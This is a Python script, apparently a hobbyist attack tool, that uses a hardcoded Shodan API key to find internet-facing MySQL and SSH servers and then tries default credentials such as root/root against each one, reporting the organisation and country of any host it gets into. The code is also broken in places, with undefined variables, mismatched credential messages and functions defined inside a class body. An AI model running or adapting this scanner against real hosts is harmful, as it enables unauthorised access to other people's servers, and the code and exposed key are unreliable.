from curses import echo
from doctest import script_from_examples
from pprint import pprint
from pydbus import connect
from paramiko import SSHClient
from paramiko.ssh_exception import SSHException
import paramiko

import var_dump
import shodan
import mysql.connector
import time
import sys



#shodan API key
SHODAN_API_KEY = "fD1T4vSYKQaQrtwuGy0Ya4odIOJ1eYs9"
api = shodan.Shodan(SHODAN_API_KEY)




#Weak mysql servers searching
class Exploit:
    
    #ask for user input
    input_type = input("What do you want to search for?\n\n1. Vulnerable servers\n2. Exit\n")
    if input_type == "1":
        print("\n")
        input_type_server = input("What server do you want to target?\n1. Mysql\n2. Ssh\n\n3. Exit\n")
        if input_type_server == "3":
            sys.exit()
        else:
            if input_type_server == "1":
                def searchMysql():
                    try:
                        for i in range(0, 100):
                            print("\r[#]Searching for open mysql servers... " + str(i) + "%", end="")
                            time.sleep(0.01)
                        print("\r[#]Searching for open mysql servers... 100%")
                        time.sleep(1)
                        print("\n")
                        
                        results = api.search('mysql')
                        print('Results found: %s' % results['total'])
                        for result in results['matches']:
                            print('IP: %s' % result['ip_str'])
                            IP = result['ip_str']
                            print('Port: %s' % result['port'])
                            PORT = result['port']                
                            print('Organization: %s' % result['org'])
                            ORG = result['org']
                            print('Country: %s' % result['location']['country_name'])
                            COUNTRY = result['location']['country_name']    
                            Exploit.connect(IP, PORT, ORG, COUNTRY)
                            print('\n')              
                        # var_dump.var_dump(IP, PORT, ORG, COUNTRY)
                    except shodan.APIError as e:    
                        print('Error: %s' % e)
                searchMysql()


            elif input_type_server == "2":
                def searchSsh():
                    try:
                        for i in range(0, 100):
                            print("\r[#]Searching for open ssh servers... " + str(i) + "%", end="")
                            time.sleep(0.01)
                        print("\r[#]Searching for open ssh servers... 100%")
                        time.sleep(1)
                        print("\n")
                        
                        results = api.search('ssh')
                        print('Results found: %s' % results['total'])
                        for result in results['matches']:
                            print('IP: %s' % result['ip_str'])
                            IP_SSH = result['ip_str']
                            print('Port: %s' % result['port'])
                            PORT_SSH = result['port']                
                            print('Organization: %s' % result['org'])
                            ORG_SSH = result['org']
                            print('Country: %s' % result['location']['country_name'])
                            COUNTRY_SSH = result['location']['country_name']    
                            Exploit.connect(IP_SSH, PORT_SSH, ORG_SSH, COUNTRY_SSH)
                            print('\n')              
                        # var_dump.var_dump(IP, PORT, ORG, COUNTRY)
                    except shodan.APIError as e:    
                        print('Error: %s' % e)
            else:
                print("\n")
                print("[!]Error: Invalid input or range")
                print("\n")
                sys.exit()
    
    elif input_type == "2":
        sys.exit()
    else:
        print("\n")
        print("[!]Invalid input type or range")
        print("\n")
        sys.exit()
        
        
        
#connects to weak mysql or ssh servers online

    def connect(IP, PORT, ORG, COUNTRY):
        # IP = IP.replace(".", ":")
        try:
            # pprint(COUNTRY)
            print ("\n[#]Connecting to " + IP + ":" + str(PORT) + "...")
            time.sleep(2)
            mydb = mysql.connector.connect(
                host=IP,
                port=PORT,
                user='user',
                passwd='root'
            )
            print("Connected to: " + IP)
            print("port: " + str(PORT))
            print("Version: " + mydb
            .get_server_info())
            print("\n")
            if mydb.is_connected():
                print("[#]Successfully connected to " + IP + ":" + str(PORT) + " with username: root and password: root")
                print("[#]Organization: " + ORG)
                print("[#]Country: " + COUNTRY)
                print("\n")
                mydb.close()
        except mysql.connector.Error as err:
            print("one error of so many errors: {}".format(err))
        pass
                
        #connect to ssh server
        try:
            # pprint(COUNTRY)
            print ("\n[#]Connecting to " + IP_SSH + ":" + str(PORT_SSH) + "...")
            time.sleep(2)
            ssh = paramiko.SSHClient()
            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            ssh.connect(IP_SSH, PORT_SSH, username='root', password='root')
            print("Connected to: " + IP_SSH)
            print("port: " + str(PORT_SSH))
            print("\n")
            if mydb.is_connected():
                print("[#]Successfully connected to " + IP + ":" + str(PORT_SSH) + " with username: root and password: root")
                print("[#]Organization: " + ORG_SSH)
                print("[#]Country: " + COUNTRY_SSH)
                print("\n")
                mydb.close()
        except mysql.connector.Error as err:
            print("one error of so many errors: {}".format(err))


    

Exploit.searchSsh()


#if not allowed to connect the mysql server is not public so not so vulnerable
        


    # var_dump.var_dump(IP, PORT)
    # connect(IP, PORT, ORG, COUNTRY)
    # connect(IP, PORT, ORG, COUNTRY)
